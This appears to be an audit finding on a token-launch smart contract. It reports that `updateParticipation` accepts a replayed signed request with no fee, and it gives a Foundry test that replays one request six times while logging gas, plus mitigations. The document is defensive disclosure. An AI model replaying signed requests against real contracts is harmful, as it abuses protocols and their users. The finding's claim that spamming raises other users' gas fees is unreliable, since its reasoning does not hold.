Bald Crimson Alligator

Medium

# Malicious user causing griefing attack on `Launch`.

### Summary

`Launch::updateParticipation` allows update requested token amount for existing participation. However, wicked user could spamming this function at high frequency making the gas associated with the function high. This is possible since there is no check for replay `newLaunchParticipationId` meaning the same `newLaunchParticipationId` can used over and over again making it easy for the wicked user to spam the function.

### Root Cause

1. Lack of payment of fees for updating requested amount
2. Lack of check if the wicked user can update more tha twice or three times
3. Lack of check for replay `newLaunchParticipationId`

### Internal Pre-conditions

1. Lack of check for replay `newLaunchParticipationId`
2. The function lacks payment of fees for updating

### External Pre-conditions

None

### Attack Path

1. A wicked user calls `Launch::participate` to participate in a `ACTIVE` in a launch group using the request generated by Rova backend.
2. The wicked user calls `Launch::updateParticipation` to update his requested token amount for existing participation using the request generated by Rova backend, provided the `finalizesAtParticipation` is false, `endsAt` has not passed and the maximum amount has not been reached.
3. If `endsAt` has not passed, the wicked user calls `Launch::updateParticipation` again using the same request generated by Rova backend since there is no payment of fees for updating and check if the request(`newLaunchParticipationId`) is still valid.
4. The wicked user abuse the function by calling it multiple times and at a frequency(probably using a bot).

### Impact

Increase in the gas cost associated with `Launch::updateParticipation` such that a real user will have to pay a higher fee when `Launch::updateParticipation` is called.

The Logs of the PoC below shows the gas firstly decreases and start to increase after the third call. If the function is spammed at very high frequency, the gas will pass the initial gas cost.

### PoC

Make the following changes in `LaunchTestBase::_createParticipationRequest`

1. Edit `tokenAmount` to `500 * 10 ** launch.tokenDecimals(),`.

Paste the following code snippet in `LaunchUpdateParticipationTest`.

```javascript
    function test_UpdateParticipation_GriefingAttack() public {
        vm.txGasPrice(1);
        // Prepare update participation request
        UpdateParticipationRequest memory updateRequest = _createUpdateParticipationRequest(500);
        bytes memory updateSignature = _signRequest(abi.encode(updateRequest));

        vm.startPrank(user1);
        uint256 updatedCurrencyAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurrencyAmount);

        // Expect ParticipationUpdated event
        vm.expectEmit();
        emit ParticipationUpdated(
            updateRequest.launchGroupId,
            updateRequest.newLaunchParticipationId,
            testUserId,
            user1,
            updateRequest.tokenAmount,
            address(currency)
        );

        // first calling
        uint256 gasStart = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the first: ", gasUsedFirst);

        // Verify update
        // ParticipationInfo memory newInfo = launch.getParticipationInfo(updateRequest.newLaunchParticipationId);
        // _verifyParticipationInfo(newInfo, updateRequest);

        vm.stopPrank();

        // Second calling
        vm.startPrank(user1);
        uint256 updatedCurrAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurrAmount);

        uint256 gasStartTwo = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEndTwo = gasleft();

        uint256 gasUsedSecond = (gasStartTwo - gasEndTwo) * tx.gasprice;
        console.log("Gas cost of the Second: ", gasUsedSecond);
        vm.stopPrank();

        // Third calling
        vm.startPrank(user1);
        uint256 updatedCurryAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurryAmount);

        uint256 gasStartThree = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEndThree = gasleft();

        uint256 gasUsedThird = (gasStartThree - gasEndThree) * tx.gasprice;
        console.log("Gas cost of the Three: ", gasUsedThird);
        vm.stopPrank();

        //Fourth Calling
        vm.startPrank(user1);
        uint256 updatedCurr =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCurr);

        uint256 gasStartFourth = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEndFourth = gasleft();

        uint256 gasUsedFourth = (gasStartFourth - gasEndFourth) * tx.gasprice;
        console.log("Gas cost of the Fourth: ", gasUsedFourth);
        vm.stopPrank();

        // Five Calling
        vm.startPrank(user1);
        uint256 updatedCur =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedCur);

        uint256 gasStartFive = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEndFive = gasleft();

        uint256 gasUsedFive = (gasStartFive - gasEndFive) * tx.gasprice;
        console.log("Gas cost of the Five: ", gasUsedFive);
        vm.stopPrank();

        // Sixth calling
                vm.startPrank(user1);
        uint256 updatedAmount =
            _getCurrencyAmount(updateRequest.launchGroupId, updateRequest.currency, updateRequest.tokenAmount);
        currency.approve(address(launch), updatedAmount);

        uint256 gasStartSixth = gasleft();
        launch.updateParticipation(updateRequest, updateSignature);
        uint256 gasEndSixth = gasleft();

        uint256 gasUsedSixth = (gasStartSixth - gasEndSixth) * tx.gasprice;
        console.log("Gas cost of the Sixth: ", gasUsedSixth);
        vm.stopPrank();
    }
```

### Mitigation

1. Add a modifier that will charge fees for updating requested token(This is beneficial to the protocol).
2. Enforce a check to disallow the replay of `newLaunchParticipationId` just as in https://github.com/dpm-labs/rova-contracts/blob/b03e4ede50488a2000bb73d602e28ee4f6c0941f/src/Launch.sol#L237